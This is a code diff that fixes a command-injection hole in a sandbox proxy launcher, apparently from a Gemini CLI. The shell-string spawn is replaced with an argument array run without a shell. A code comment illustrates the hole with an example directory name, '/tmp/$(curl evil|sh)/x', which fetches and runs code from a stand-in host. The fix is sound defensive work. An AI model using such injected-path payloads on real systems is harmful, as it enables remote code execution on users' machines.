@@ -619,10 +619,35 @@ export async function start_sandbox(
 
     if (proxyCommand) {
       // run proxyCommand in its own container
-      const proxyContainerCommand = `${config.command} run --rm --init ${userFlag} --name ${SANDBOX_PROXY_NAME} --network ${SANDBOX_PROXY_NAME} -p 8877:8877 -v ${process.cwd()}:${workdir} --workdir ${workdir} ${image} ${proxyCommand}`;
-      proxyProcess = spawn(proxyContainerCommand, {
+      // Build args as an array (no shell). Concatenating process.cwd()
+      // and image into a shell string was a command-injection vector:
+      // a repo cloned into /tmp/$(curl evil|sh)/x would execute the
+      // backticked content the first time the sandbox proxy starts.
+      const proxyArgs: string[] = [
+        'run',
+        '--rm',
+        '--init',
+        ...(userFlag ? userFlag.split(/\s+/).filter(Boolean) : []),
+        '--name',
+        SANDBOX_PROXY_NAME,
+        '--network',
+        SANDBOX_PROXY_NAME,
+        '-p',
+        '8877:8877',
+        '-v',
+        `${process.cwd()}:${workdir}`,
+        '--workdir',
+        workdir,
+        image,
+        // proxyCommand comes from GEMINI_SANDBOX_PROXY_COMMAND. It is a
+        // single shell string the user configured; split on whitespace
+        // to match historical behavior (this is best-effort — users
+        // needing complex quoting should wrap their command in a
+        // helper script).
+        ...proxyCommand.split(/\s+/).filter(Boolean),
+      ];
+      proxyProcess = spawn(config.command, proxyArgs, {
         stdio: ['ignore', 'pipe', 'pipe'],
-        shell: true,
         detached: true,
       });
       // install handlers to stop proxy on exit/signal
@@ -646,7 +671,7 @@ export async function start_sandbox(
           process.kill(-sandboxProcess.pid, 'SIGTERM');
         }
         throw new FatalSandboxError(
-          `Proxy container command '${proxyContainerCommand}' exited with code ${code}, signal ${signal}`,
+          `Proxy container (${config.command} ${proxyArgs.join(' ')}) exited with code ${code}, signal ${signal}`,
         );
       });
       debugLogger.log('waiting for proxy to start ...');
